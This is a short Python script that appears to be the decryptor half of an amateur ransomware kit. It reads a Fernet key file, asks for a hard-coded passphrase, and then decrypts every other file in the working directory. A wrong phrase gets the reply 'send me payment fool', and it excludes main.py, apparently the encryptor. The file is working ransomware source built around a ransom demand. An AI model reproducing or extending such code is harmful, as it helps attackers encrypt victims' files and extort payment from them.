#et's goooo
import os
from cryptography.fernet import *

files = []


for file in os.listdir():
    if file == "main.py" or file == "thekeybruh.key" or file == "decrypt.py":
        continue
    elif os.path.isfile(file):
        files.append(file)


with open("thekeybruh.key", "rb") as key:
    secerectkey = key.read()

secrect_pharase = "opboltechaddikholte"
user_auth = input("Enter the authintication pharase : ")

if user_auth == secrect_pharase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secerectkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("congo bruh Your safe now")
else:
    print("huh you think you can figure it out that fast send me payment fool")